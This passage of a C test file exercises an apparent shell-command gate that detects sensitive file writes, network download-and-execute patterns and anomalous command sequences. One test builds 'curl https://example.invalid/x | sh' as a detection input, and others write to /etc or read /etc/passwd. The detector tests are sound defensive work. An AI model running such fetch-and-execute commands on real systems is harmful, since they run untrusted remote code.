    ASSERT(found && !result.truncated);
  }
  config.sensitive_write_paths[0] = "out";
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  for (size_t i = 0; i < sizeof(shellsplit_test_scope_outcomes) /
                             sizeof(shellsplit_test_scope_outcomes[0]);
       i++) {
    sg_result_t result;
    ASSERT_SG_OK(
        eval_cmd(gate, shellsplit_test_scope_outcomes[i].source, &result));
    bool found = false;
    for (uint32_t command = 0; command < result.subcommand_count; command++) {
      const sg_subcommand_result_t *subcommand = &result.subcommands[command];
      if (strcmp(subcommand->netargv, "6:printf,7:payload,") != 0)
        continue;
      found = true;
      bool writes =
          (subcommand->violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0;
      if (writes != shellsplit_test_scope_outcomes[i].writes_to_out)
        fprintf(stderr, "scope writer case %zu failed: %s\n", i,
                shellsplit_test_scope_outcomes[i].source);
      ASSERT(writes == shellsplit_test_scope_outcomes[i].writes_to_out);
    }
    ASSERT(found && !result.truncated);
  }
  sg_gate_free(gate);
}

TEST(named_fd_cleanup_consumer_violations) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/workspace"));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  const char *paths[] = {"base", "one", "two"};
  for (size_t path = 0; path < sizeof(paths) / sizeof(paths[0]); path++) {
    sg_violation_config_t config;
    sg_violation_config_default(&config);
    config.sensitive_write_paths[0] = paths[path];
    config.sensitive_write_path_count = 1;
    config.sensitive_read_paths[0] = paths[path];
    config.sensitive_read_path_count = 1;
    ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
    for (size_t i = 0; i < sizeof(shellsplit_test_named_cleanup) /
                               sizeof(shellsplit_test_named_cleanup[0]);
         i++) {
      const shellsplit_test_named_cleanup_case_t *fixture =
          &shellsplit_test_named_cleanup[i];
      sg_result_t result;
      ASSERT_SG_OK(eval_cmd(gate, fixture->source, &result));
      ASSERT(!result.truncated);
      char netargv[80];
      if (fixture->read)
        snprintf(netargv, sizeof(netargv), "3:cat,");
      else if (fixture->timer)
        snprintf(netargv, sizeof(netargv), "4:exec,");
      else
        snprintf(netargv, sizeof(netargv), "6:printf,%zu:%s,",
                 strlen(fixture->argument), fixture->argument);
      bool found = false;
      for (uint32_t c = 0; c < result.subcommand_count; c++) {
        const sg_subcommand_result_t *command = &result.subcommands[c];
        if (strcmp(command->netargv, netargv))
          continue;
        found = true;
        if (fixture->timer)
          continue; /* TIME owns its report; it is not command byte I/O. */
        if (fixture->read) {
          /* READ_SECRETS classifies filename arguments, not stdin redirects.
           * Actual read endpoints are asserted by the shared graph oracle. */
          ASSERT(command->read_count ==
                 1u + (fixture->alternative_file != NULL));
          continue;
        }
        bool sensitive =
            (command->violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0;
        bool expected = strcmp(paths[path], fixture->file) == 0 ||
                        (fixture->alternative_file &&
                         strcmp(paths[path], fixture->alternative_file) == 0);
        if (sensitive != expected)
          fprintf(stderr, "named cleanup consumer %zu path %s: %s\n", i,
                  paths[path], fixture->source);
        ASSERT(sensitive == expected);
      }
      ASSERT(found);
    }
  }
  sg_violation_config_t setup_config;
  sg_violation_config_default(&setup_config);
  setup_config.sensitive_write_paths[0] = "one";
  setup_config.sensitive_write_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &setup_config));
  sg_result_t setup_result;
  ASSERT_SG_OK(eval_cmd(gate, "exec 10>&-; true 10>&- {a}>one", &setup_result));
  bool setup_found = false;
  for (uint32_t c = 0; c < setup_result.subcommand_count; c++) {
    const sg_subcommand_result_t *command = &setup_result.subcommands[c];
    if (strcmp(command->netargv, "4:true,"))
      continue;
    setup_found = true;
    ASSERT(command->write_count == 1);
    ASSERT((command->violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0);
  }
  ASSERT(setup_found);
  sg_gate_free(gate);
}

TEST(named_fd_ifs_consumer_violations) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/workspace"));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = "out";
  config.sensitive_write_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  for (size_t i = 0; i < sizeof(shellsplit_test_ifs_routes) /
                             sizeof(shellsplit_test_ifs_routes[0]);
       i++) {
    const shellsplit_test_ifs_route_case_t *fixture =
        &shellsplit_test_ifs_routes[i];
    sg_result_t result;
    sg_error_t status = eval_cmd(gate, fixture->source, &result);
    if (!fixture->supported) {
      ASSERT(status == SG_ERR_PARSE && result.verdict == SG_VERDICT_REJECT);
      continue;
    }
    ASSERT(status == SG_OK && !result.truncated);
    bool found = false;
    for (uint32_t c = 0; c < result.subcommand_count; c++) {
      const sg_subcommand_result_t *command = &result.subcommands[c];
      if (strcmp(command->netargv, "6:printf,7:payload,"))
        continue;
      found = true;
      bool writes =
          (command->violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0;
      if (writes != fixture->writes)
        fprintf(stderr, "IFS gate route case %zu: %s\n", i, fixture->source);
      ASSERT(writes == fixture->writes);
    }
    ASSERT(found);
  }
  sg_gate_free(gate);
}

TEST(reachability_cwd_sensitive_paths) {
  sg_gate_t *gate = sg_gate_new();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_cwd(gate, "/workspace"));
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  ASSERT_SG_OK(sg_gate_set_stop_mode(gate, SG_EVAL_ALL));
  sg_violation_config_t config;
  sg_violation_config_default(&config);
  config.sensitive_write_paths[0] = "/workspace/out";
  config.sensitive_write_path_count = 1;
  ASSERT_SG_OK(sg_gate_set_violation_config_borrowed(gate, &config));
  for (size_t i = 0; i < sizeof(shellsplit_test_cwd_reachability) /
                             sizeof(shellsplit_test_cwd_reachability[0]);
       i++) {
    if (strcmp(shellsplit_test_cwd_reachability[i].file, "out") != 0 ||
        strstr(shellsplit_test_cwd_reachability[i].source, "printf payload") ==
            NULL)
      continue;
    sg_result_t result;
    ASSERT_SG_OK(
        eval_cmd(gate, shellsplit_test_cwd_reachability[i].source, &result));
    bool expected = shellsplit_test_cwd_reachability[i].identity &&
                    strcmp(shellsplit_test_cwd_reachability[i].identity,
                           "/workspace/out") == 0;
    bool found = false;
    for (uint32_t c = 0; c < result.subcommand_count; c++) {
      const sg_subcommand_result_t *subcommand = &result.subcommands[c];
      if (strcmp(subcommand->netargv, "6:printf,7:payload,") != 0)
        continue;
      found = true;
      bool actual =
          (subcommand->violation_type_flags & SG_VIOL_WRITE_SENSITIVE) != 0;
      if (actual != expected)
        fprintf(stderr, "CWD sensitive-path case %zu: %s\n", i,
                shellsplit_test_cwd_reachability[i].source);
      ASSERT(actual == expected);
    }
    ASSERT(found && !result.truncated);
  }
  for (size_t i = 0; i < sizeof(shellsplit_test_skipped_dup_operands) /
                             sizeof(shellsplit_test_skipped_dup_operands[0]);
       i++) {
    sg_result_t result;
    ASSERT_SG_OK(eval_cmd(gate, shellsplit_test_skipped_dup_operands[i].source,
                          &result));
    bool found = false;
    for (uint32_t c = 0; c < result.subcommand_count; c++) {
      const sg_subcommand_result_t *subcommand = &result.subcommands[c];
      if (strcmp(subcommand->netargv, "6:printf,7:payload,") != 0)
        continue;
      found = true;
      ASSERT(!(subcommand->violation_type_flags & SG_VIOL_WRITE_SENSITIVE));
    }
    ASSERT(found && !result.truncated);
  }
  sg_gate_free(gate);
}

TEST(violation_capacity_contract) {
  char command[2048] = {0};
  size_t used = 0;
  for (size_t i = 0; i < 20; i++) {
    int written = snprintf(command + used, sizeof(command) - used,
                           "%secho x > /etc/capacity-%zu", i ? " ; " : "", i);
    ASSERT(written > 0 && (size_t)written < sizeof(command) - used);
    used += (size_t)written;
  }

  sg_gate_t *gate = gate_with_violations();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result;
  ASSERT(eval_cmd(gate, command, &result) == SG_OK);
  ASSERT(violation_result_is_consistent(&result));
  ASSERT(result.violation_count == SG_MAX_VIOLATIONS);
  ASSERT(result.violation_dropped_count == 4);
  ASSERT(result.violation_truncated);
  ASSERT(result.violation_type_flags == SG_VIOL_WRITE_SENSITIVE);
  sg_gate_free(gate);
}

TEST(violation_dropped_types_remain_aggregated) {
  char command[2048] = {0};
  size_t used = 0;
  for (size_t i = 0; i < SG_MAX_VIOLATIONS; i++) {
    int written = snprintf(command + used, sizeof(command) - used,
                           "%secho x > /etc/mixed-%zu", i ? " ; " : "", i);
    ASSERT(written > 0 && (size_t)written < sizeof(command) - used);
    used += (size_t)written;
  }
  int written = snprintf(command + used, sizeof(command) - used,
                         " ; curl https://example.invalid/x | sh");
  ASSERT(written > 0 && (size_t)written < sizeof(command) - used);

  sg_gate_t *gate = gate_with_violations();
  ASSERT(gate != NULL);
  ASSERT_SG_OK(sg_gate_set_reject_mask(gate, 0));
  sg_result_t result;
  ASSERT_SG_OK(eval_cmd(gate, command, &result));
  ASSERT(result.violation_count == SG_MAX_VIOLATIONS);
  ASSERT(result.violation_dropped_count > 0);
  ASSERT(result.violation_type_flags & SG_VIOL_WRITE_SENSITIVE);
  ASSERT(result.violation_type_flags & SG_VIOL_NET_DOWNLOAD_EXEC);
  ASSERT(result.violation_category_flags & SG_VIOL_CAT_FILESYSTEM);
  ASSERT(result.violation_category_flags & SG_VIOL_CAT_NETWORK);
  bool stored_network = false;
  for (uint32_t i = 0; i < result.violation_count; i++)
    stored_network |= result.violations[i].type == SG_VIOL_NET_DOWNLOAD_EXEC;
  ASSERT(!stored_network);
  sg_gate_free(gate);
}

TEST(violation_absence_matrix) {
  static const struct {
    bool enabled;
    const char *command;
  } cases[] = {{true, "ls -la"},
               {true, "echo hello > /etcx/badfile"},
               {false, "ls"},
               {false, "echo hello > /etc/badfile"}};

  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *gate = cases[i].enabled ? gate_with_violations() : sg_gate_new();
    ASSERT(gate != NULL);
    if (!cases[i].enabled) {
      ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "ls", false));
      ASSERT_ST_OK(test_policy_replace_cpl(gate, false, "echo *", false));
    }
    sg_result_t result;
    ASSERT(eval_cmd(gate, cases[i].command, &result) == SG_OK);
    ASSERT(violation_result_is_consistent(&result));
    ASSERT(!result.has_violations);
    ASSERT(result.violation_count == 0);
    ASSERT(result.violation_type_flags == 0);
    sg_gate_free(gate);
  }
}

/* --- PROPERTY TESTS --- */

#define PROPTEST_COUNT 200
#define PROPTEST_SEED 42

static unsigned int prop_rand_state = PROPTEST_SEED;

static unsigned int prop_next(void) {
  prop_rand_state = prop_rand_state * 1103515245 + 12345;
  return (prop_rand_state >> 16) & 0x7FFF;
}

static void prop_reset(void) { prop_rand_state = PROPTEST_SEED; }

static const char *pick_one(const char *const *arr, size_t len) {
  return arr[prop_next() % len];
}

static size_t gen_cat_cmd(char *buf, size_t cap) {
  static const char *files[] = {"/etc/passwd",        "/etc/hosts",
                                "/tmp/test.txt",      "/var/log/syslog",
                                "/home/user/.bashrc", "/dev/null"};
  const char *f = pick_one(files, sizeof(files) / sizeof(files[0]));
  return (size_t)snprintf(buf, cap, "cat %s", f);
}

static size_t gen_ls_cmd(char *buf, size_t cap) {
  static const char *flags[] = {"", "-l", "-la", "-a", "-lh", "-ltr"};
  static const char *paths[] = {"/tmp", "/var/log", "/home/user", "/etc"};
  const char *flag = pick_one(flags, sizeof(flags) / sizeof(flags[0]));
  const char *path = pick_one(paths, sizeof(paths) / sizeof(paths[0]));
  return (size_t)snprintf(buf, cap, "ls %s %s", flag, path);
}

static size_t gen_grep_cmd(char *buf, size_t cap) {
  static const char *flags[] = {"", "-i", "-r", "-n", "-l", "-v"};
  static const char *patts[] = {"error", "warn", "INFO", "DEBUG", "failed"};
  static const char *paths[] = {"/var/log/syslog", "/tmp/test.log",
                                "/etc/passwd"};
  const char *flag = pick_one(flags, sizeof(flags) / sizeof(flags[0]));
  const char *patt = pick_one(patts, sizeof(patts) / sizeof(patts[0]));
  const char *path = pick_one(paths, sizeof(paths) / sizeof(paths[0]));
  return (size_t)snprintf(buf, cap, "grep %s %s %s", flag, patt, path);
}

static size_t gen_git_cmd(char *buf, size_t cap) {
  static const char *cmds[] = {
      "git status",           "git log --oneline -5", "git diff HEAD~1",
      "git branch -a",        "git stash list",       "git remote -v",
      "git show HEAD --stat", "git tag -l",           "git reflog -3"};
  const char *c = pick_one(cmds, sizeof(cmds) / sizeof(cmds[0]));
  return (size_t)snprintf(buf, cap, "%s", c);
}

static size_t gen_docker_cmd(char *buf, size_t cap) {
  static const char *cmds[] = {"docker ps",
                               "docker images",
                               "docker ps -a",
                               "docker container ls",
                               "docker volume ls",
                               "docker network ls",
                               "docker ps --format '{{.Names}}'",
                               "docker stats --no-stream"};
  const char *c = pick_one(cmds, sizeof(cmds) / sizeof(cmds[0]));
  return (size_t)snprintf(buf, cap, "%s", c);
}

static size_t gen_curl_cmd(char *buf, size_t cap) {
  static const char *flags[] = {"-s", "-v", "-i", "-o /dev/null"};
  static const char *urls[] = {
      "https://api.github.com", "https://httpbin.org/get",
      "https://localhost:8080/health", "https://example.com"};
  const char *flag = pick_one(flags, sizeof(flags) / sizeof(flags[0]));
  const char *url = pick_one(urls, sizeof(urls) / sizeof(urls[0]));
  return (size_t)snprintf(buf, cap, "curl %s %s", flag, url);
}

static size_t gen_echo_cmd(char *buf, size_t cap) {
  static const char *msgs[] = {"hello", "world", "test", "ok", "done", "error"};
  const char *msg = pick_one(msgs, sizeof(msgs) / sizeof(msgs[0]));
  return (size_t)snprintf(buf, cap, "echo %s", msg);
}

static size_t gen_pwd_cmd(char *buf, size_t cap) {
  (void)pick_one;
  return (size_t)snprintf(buf, cap, "pwd");
}

static size_t gen_whoami_cmd(char *buf, size_t cap) {
  (void)pick_one;
  return (size_t)snprintf(buf, cap, "whoami");
}

static size_t gen_date_cmd(char *buf, size_t cap) {
  (void)pick_one;
  return (size_t)snprintf(buf, cap, "date");
}

static size_t gen_ps_cmd(char *buf, size_t cap) {
  static const char *flags[] = {"aux", ""};
  const char *f = pick_one(flags, sizeof(flags) / sizeof(flags[0]));
  return (size_t)snprintf(buf, cap, "ps %s", f);
}

static size_t gen_find_cmd(char *buf, size_t cap) {
  static const char *opts[] = {"-type f", "-type d", "-name '*.txt'",
                               "-type f -name '*.log'"};
  const char *opt = pick_one(opts, sizeof(opts) / sizeof(opts[0]));
  return (size_t)snprintf(buf, cap, "find /tmp %s -print", opt);
}

static size_t gen_sort_cmd(char *buf, size_t cap) {
  static const char *flags[] = {"", "-r", "-n"};
  const char *f = pick_one(flags, sizeof(flags) / sizeof(flags[0]));
  return (size_t)snprintf(buf, cap, "sort %s", f);
}

static size_t gen_head_tail_cmd(char *buf, size_t cap) {
  static const char *cmds[] = {"head -5 /etc/passwd", "tail -3 /var/log/syslog",
                               "head -1 /etc/hosts", "tail -1 /etc/passwd"};
  const char *c = pick_one(cmds, sizeof(cmds) / sizeof(cmds[0]));
  return (size_t)snprintf(buf, cap, "%s", c);
}

static size_t gen_wc_cmd(char *buf, size_t cap) {
  static const char *flags[] = {"-l", "-w", "-c"};
  const char *f = pick_one(flags, sizeof(flags) / sizeof(flags[0]));
  return (size_t)snprintf(buf, cap, "wc %s", f);
}

static size_t gen_uniq_cmd(char *buf, size_t cap) {
  static const char *flags[] = {"", "-c", "-d"};
  const char *f = pick_one(flags, sizeof(flags) / sizeof(flags[0]));
  return (size_t)snprintf(buf, cap, "uniq %s", f);
}

static size_t (*generators[])(char *, size_t) = {
    gen_cat_cmd,    gen_ls_cmd,        gen_grep_cmd, gen_git_cmd,
    gen_docker_cmd, gen_curl_cmd,      gen_echo_cmd, gen_pwd_cmd,
    gen_whoami_cmd, gen_date_cmd,      gen_ps_cmd,   gen_find_cmd,
    gen_sort_cmd,   gen_head_tail_cmd, gen_wc_cmd,   gen_uniq_cmd,
};

static const char *gen_name(size_t idx) {
  static const char *names[] = {
      "gen_cat_cmd",    "gen_ls_cmd",        "gen_grep_cmd", "gen_git_cmd",
      "gen_docker_cmd", "gen_curl_cmd",      "gen_echo_cmd", "gen_pwd_cmd",
      "gen_whoami_cmd", "gen_date_cmd",      "gen_ps_cmd",   "gen_find_cmd",
      "gen_sort_cmd",   "gen_head_tail_cmd", "gen_wc_cmd",   "gen_uniq_cmd"};
  return names[idx];
}

static size_t gen_by_index(char *buf, size_t cap, size_t idx) {
  return generators[idx % (sizeof(generators) / sizeof(generators[0]))](buf,
                                                                        cap);
}

TEST(glob_pattern_in_rule) {
  /* Regression: patterns with glob tokens (*.txt) were rejected by
   * parse_pattern because *.txt matched the * (ANY) symbol prefix
   * and .txt was treated as an invalid parameter suffix. */
  static const struct {
    const char *rule;
    const char *command;
  } cases[] = {
      {"echo *.txt", "echo *.txt"},
      {"find #p #sopt *.txt -print", "find /tmp -name '*.txt' -print"},
      {"find #p #sopt #glob -print", "find /tmp -name '*.txt' -print"}};
  for (size_t i = 0; i < sizeof(cases) / sizeof(cases[0]); i++) {
    sg_gate_t *g = sg_gate_new();
    ASSERT(g != NULL);
    ASSERT_ST_OK(test_policy_replace_cpl(g, false, cases[i].rule, false));
    sg_result_t result;
    ASSERT(eval_cmd(g, cases[i].command, &result) == SG_OK);
    ASSERT(result.verdict == SG_VERDICT_ALLOW);
    ASSERT_STR(result.subcommands[0].display_command, cases[i].command);
    sg_gate_free(g);
  }
}

TEST(property_suggestion_leads_to_allow) {
  char cmd_buf[512];
  char suggestion_buf[512];
  size_t total_round_trips = 0;

  for (size_t gi = 0; gi < sizeof(generators) / sizeof(generators[0]); gi++) {
    int failures_before = fail_count;
    prop_reset();

    sg_gate_t *g = sg_gate_new();
    size_t generator_round_trips = 0;

    for (int i = 0; i < PROPTEST_COUNT; i++) {
      memset(cmd_buf, 0, sizeof(cmd_buf));
      gen_by_index(cmd_buf, sizeof(cmd_buf), gi);

      sg_result_t r;
      ASSERT_SG_OK(eval_cmd(g, cmd_buf, &r));

      if (r.subcommand_count == 0 || r.subcommands[0].display_command == NULL) {
        continue;
      }
      if (r.subcommands[0]
              .display_command[strlen(r.subcommands[0].display_command)] !=
          '\0') {
        printf(
            "    FAIL: gen=%s iter=%d result not null-terminated cmd=\"%s\"\n",
            gen_name(gi), i, cmd_buf);
        fail_count++;
        continue;
      }

      if (r.verdict == SG_VERDICT_ALLOW) {
        continue;
      }

      if (r.verdict != SG_VERDICT_UNDETERMINED) {
        continue;
      }

      if (r.suggestion_count == 0 || r.suggestions[0] == NULL) {
        continue;
      }

      int pick = prop_next() % r.suggestion_count;
      snprintf(suggestion_buf, sizeof(suggestion_buf), "%s",
               r.suggestions[pick]);
      if (test_policy_replace_cpl(g, false, suggestion_buf, false) != ST_OK) {
        printf("    FAIL: gen=%s iter=%d could not add suggestion[%d]\n",
               gen_name(gi), i, pick);
        fail_count++;
        continue;
      }
      generator_round_trips++;
      total_round_trips++;

      sg_result_t r2;
      ASSERT_SG_OK(eval_cmd(g, cmd_buf, &r2));

      if (r2.verdict != SG_VERDICT_ALLOW) {
        printf("    FAIL: gen=%s iter=%d suggestion[%d]=\"%s\" still %d "
               "cmd=\"%s\"\n",
               gen_name(gi), i, pick, suggestion_buf, r2.verdict, cmd_buf);
        fail_count++;
      }
    }

    sg_gate_free(g);
    ASSERT(fail_count == failures_before);
    ASSERT(generator_round_trips > 0);
    printf("    checked: %s (%zu suggestion round-trips)\n", gen_name(gi),
           generator_round_trips);
  }
  ASSERT(total_round_trips > 0);
}

/* --- ANOMALY DETECTION TESTS --- */

TEST(anomaly_enable_disable) {
  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  const char *sequence = "cat /etc/hosts ; grep root ; sort";
  ASSERT_SG_OK(sg_gate_set_stop_mode(g, SG_EVAL_ALL));

  /* Initially disabled */
  sg_result_t r;
  ASSERT_SG_OK(eval_cmd(g, sequence, &r));
  ASSERT(r.anomaly_detected == false);
  ASSERT(r.anomaly_score == 0.0);
  ASSERT_EQ_UINT(test_anomaly_vocabulary(g), 0);

  /* Enabling starts a fresh model that learns the evaluated sequence. */
  sg_error_t err = sg_gate_enable_anomaly(g, 5.0, NULL);
  ASSERT(err == SG_OK);
  ASSERT(!sg_gate_anomaly_had_error(g));
  ASSERT_SG_OK(eval_cmd(g, sequence, &r));
  ASSERT(isinf(r.anomaly_score));
  ASSERT(r.anomaly_detected == false);
  ASSERT_EQ_UINT(test_anomaly_vocabulary(g), 3);

  /* Disabling drops the model and restores inert anomaly results. */
  sg_gate_disable_anomaly(g);
  ASSERT(!sg_gate_anomaly_had_error(g));
  ASSERT_SG_OK(eval_cmd(g, sequence, &r));
  ASSERT(r.anomaly_score == 0.0);
  ASSERT(r.anomaly_detected == false);
  ASSERT_EQ_UINT(test_anomaly_vocabulary(g), 0);

  sg_gate_free(g);
}

TEST(anomaly_learning_policy_matrix) {
  static const struct {
    bool update_only_on_allow;
    const char *command;
    sg_verdict_t verdict;
    size_t expected_vocab;
  } verdict_cases[] = {
      {false, "allowed", SG_VERDICT_ALLOW, 1},
      {false, "unknown", SG_VERDICT_UNDETERMINED, 1},
      {false, "denied", SG_VERDICT_DENY, 1},
      {true, "allowed", SG_VERDICT_ALLOW, 1},
      {true, "unknown", SG_VERDICT_UNDETERMINED, 0},
      {true, "denied", SG_VERDICT_DENY, 0},
  };

  for (size_t i = 0; i < sizeof(verdict_cases) / sizeof(verdict_cases[0]);
       i++) {
    sg_gate_t *g = sg_gate_new();
    ASSERT(g != NULL);
    ASSERT(sg_gate_enable_anomaly(g, 100.0, NULL) == SG_OK);
    ASSERT(sg_gate_set_anomaly_update_mode(
               g, verdict_cases[i].update_only_on_allow) == SG_OK);
    ASSERT(test_policy_replace_cpl(g, false, "allowed", false) == ST_OK);
    ASSERT(test_policy_replace_cpl(g, true, "denied", false) == ST_OK);

    sg_result_t result;
    ASSERT(eval_cmd(g, verdict_cases[i].command, &result) == SG_OK);
    ASSERT(result.verdict == verdict_cases[i].verdict);
    ASSERT_EQ_UINT(test_anomaly_vocabulary(g), verdict_cases[i].expected_vocab);
    sg_gate_free(g);
  }

  static const bool skip_anomalous[] = {true, false};
  for (size_t i = 0; i < sizeof(skip_anomalous) / sizeof(skip_anomalous[0]);
       i++) {
    sg_gate_t *g = sg_gate_new();
    ASSERT(g != NULL);
    ASSERT(sg_gate_enable_anomaly(g, -1.0, NULL) == SG_OK);
    ASSERT(sg_gate_set_anomaly_skip_on_detected(g, skip_anomalous[i]) == SG_OK);

    sg_result_t result;
    ASSERT(eval_cmd(g, "base1 ; base2 ; base3", &result) == SG_OK);
    ASSERT(!result.anomaly_detected);
    ASSERT_EQ_UINT(test_anomaly_vocabulary(g), 3);
    ASSERT(eval_cmd(g, "novel1 ; novel2 ; novel3", &result) == SG_OK);
    ASSERT(result.anomaly_detected);
    ASSERT_EQ_UINT(test_anomaly_vocabulary(g), skip_anomalous[i] ? 3 : 6);
    sg_gate_free(g);
  }
}

TEST(anomaly_scoring_contract_matrix) {
  /* Short sequences cannot be scored and therefore remain non-anomalous. */
  sg_gate_t *g = sg_gate_new();
  ASSERT_SG_OK(sg_gate_enable_anomaly(g, 5.0, NULL));
  ASSERT_ST_OK(test_policy_replace_cpl(g, false, "ls", false));
  ASSERT_ST_OK(test_policy_replace_cpl(g, false, "cd #path", false));

  sg_result_t r;

  ASSERT_SG_OK(eval_cmd(g, "ls", &r));
  ASSERT(r.anomaly_detected == false);
  ASSERT(r.anomaly_score == 0.0); /* Short sequence, score is 0 */
  ASSERT(r.anomaly_score_raw == 0.0);
  ASSERT(r.anomaly_score_type == 0.0);

  ASSERT_SG_OK(eval_cmd(g, "ls ; cd /tmp", &r));
  ASSERT(r.anomaly_detected == false);
  ASSERT(r.anomaly_score == 0.0);
  ASSERT(r.anomaly_score_raw == 0.0);
  ASSERT(r.anomaly_score_type == 0.0);

  /* Three or more commands produce an observable score. */
  ASSERT(eval_cmd(g, "ls ; cd /tmp ; pwd", &r) == SG_OK);
  ASSERT(!isnan(r.anomaly_score));
  sg_gate_free(g);

  static const struct {
    double threshold;
    bool detected;
  } threshold_cases[] = {{-1.0, true}, {1e300, false}};
  for (size_t i = 0; i < sizeof(threshold_cases) / sizeof(threshold_cases[0]);
       i++) {
    g = sg_gate_new();
    ASSERT(g != NULL);
    ASSERT_SG_OK(sg_gate_enable_anomaly(g, threshold_cases[i].threshold, NULL));
    for (int repetition = 0; repetition < 5; repetition++)
      ASSERT_SG_OK(eval_cmd(g, "ls ; cd /tmp ; pwd", &r));
    ASSERT_SG_OK(sg_gate_set_anomaly_update_mode(g, true));
    ASSERT_SG_OK(eval_cmd(g, "gcc ; make ; test", &r));
    ASSERT(isfinite(r.anomaly_score));
    ASSERT(r.anomaly_detected == threshold_cases[i].detected);
    sg_gate_free(g);
  }

  g = sg_gate_new();
  ASSERT(g != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(g, 5.0, NULL));
  ASSERT_ST_OK(test_policy_replace_cpl(g, false, "ls", false));
  ASSERT_ST_OK(test_policy_replace_cpl(g, false, "cd #path", false));
  ASSERT_ST_OK(test_policy_replace_cpl(g, false, "pwd", false));
  ASSERT_SG_OK(eval_cmd(g, "ls ; cd /tmp ; pwd", &r));
  size_t stable_vocab = test_anomaly_vocabulary(g);
  ASSERT(stable_vocab > 0);
  for (int i = 1; i < 10; i++)
    ASSERT_SG_OK(eval_cmd(g, "ls ; cd /tmp ; pwd", &r));
  ASSERT(isfinite(r.anomaly_score_raw) && r.anomaly_score_raw >= 0.0);
  ASSERT(isfinite(r.anomaly_score_type) && r.anomaly_score_type >= 0.0);
  ASSERT_EQ_UINT(test_anomaly_vocabulary(g), stable_vocab);
  double expected = r.anomaly_score_raw * 0.5 + r.anomaly_score_type * 0.5;
  ASSERT(fabs(r.anomaly_score - expected) < 0.0001);
  ASSERT_SG_OK(eval_cmd(g, "gcc ; make ; test", &r));
  ASSERT(isfinite(r.anomaly_score_raw) && r.anomaly_score_raw > 0.0);
  sg_gate_free(g);

  static const struct {
    const char *command;
    sg_verdict_t verdict;
    bool scorable;
  } shape_cases[] = {
      {"ls", SG_VERDICT_ALLOW, false},
      {"cd /tmp", SG_VERDICT_ALLOW, false},
      {"pwd", SG_VERDICT_ALLOW, false},
      {"ls ; cd /tmp", SG_VERDICT_ALLOW, false},
      {"cd /tmp ; pwd ; ls", SG_VERDICT_ALLOW, true},
      {"cat /etc/passwd | head", SG_VERDICT_UNDETERMINED, false},
  };
  g = sg_gate_new();
  ASSERT(g != NULL);
  ASSERT_SG_OK(sg_gate_enable_anomaly(g, 5.0, NULL));
  ASSERT_ST_OK(test_policy_replace_cpl(g, false, "ls", false));
  ASSERT_ST_OK(test_policy_replace_cpl(g, false, "cd #path", false));
  ASSERT_ST_OK(test_policy_replace_cpl(g, false, "pwd", false));
  ASSERT_ST_OK(test_policy_replace_cpl(g, false, "cat", false));
  stable_vocab = 0;
  for (size_t pass = 0; pass < 2; pass++) {
    for (size_t i = 0; i < sizeof(shape_cases) / sizeof(shape_cases[0]); i++) {
      ASSERT_SG_OK(eval_cmd(g, shape_cases[i].command, &r));
      ASSERT(r.verdict == shape_cases[i].verdict);
      if (pass == 1 && shape_cases[i].scorable) {
        ASSERT(isfinite(r.anomaly_score));
        ASSERT(isfinite(r.anomaly_score_raw));
        ASSERT(isfinite(r.anomaly_score_type));
      }
    }
    if (pass == 0) {
      stable_vocab = test_anomaly_vocabulary(g);
      ASSERT(stable_vocab > 0);
    } else {
      ASSERT_EQ_UINT(test_anomaly_vocabulary(g), stable_vocab);
    }
  }
  sg_gate_free(g);
}

TEST(anomaly_model_roundtrip) {
  static const char *training = "cat /etc/hosts ; grep root ; sort";
  static const char *probe = "cat 42 ; grep -E error ; sort";
  sg_gate_t *g = sg_gate_new();
  ASSERT(g != NULL);
  ASSERT(sg_gate_enable_anomaly(g, 100.0, NULL) == SG_OK);
  sg_result_t result;
  for (int i = 0; i < 30; i++)
    ASSERT(eval_cmd(g, training, &result) == SG_OK);

  const char *path = temp_policy_file();
  char type_path[320];
  snprintf(type_path, sizeof(type_path), "%s_type", path);
  register_temp_file(type_path);
  ASSERT(sg_gate_save_anomaly_model(g, path) == SG_OK);
  ASSERT(access(type_path, F_OK) != 0);

  sg_gate_t *g2 = sg_gate_new();
  ASSERT(g2 != NULL);
  ASSERT(sg_gate_enable_anomaly(g2, 100.0, NULL) == SG_OK);
  ASSERT(sg_gate_load_anomaly_model(g2, path) == SG_OK);
  ASSERT_EQ_UINT(test_anomaly_vocabulary(g2), test_anomaly_vocabulary(g));

  ASSERT(sg_gate_set_anomaly_update_mode(g, true) == SG_OK);
  ASSERT(sg_gate_set_anomaly_update_mode(g2, true) == SG_OK);
  sg_result_t expected, actual;
  ASSERT(eval_cmd(g, probe, &expected) == SG_OK);
  ASSERT(eval_cmd(g2, probe, &actual) == SG_OK);
  ASSERT(isfinite(expected.anomaly_score_raw));
  ASSERT(isfinite(expected.anomaly_score_type));
  ASSERT(expected.anomaly_score_raw != expected.anomaly_score_type);
  ASSERT(actual.anomaly_score_raw == expected.anomaly_score_raw);
  ASSERT(actual.anomaly_score_type == expected.anomaly_score_type);
  ASSERT(actual.anomaly_score == expected.anomaly_score);

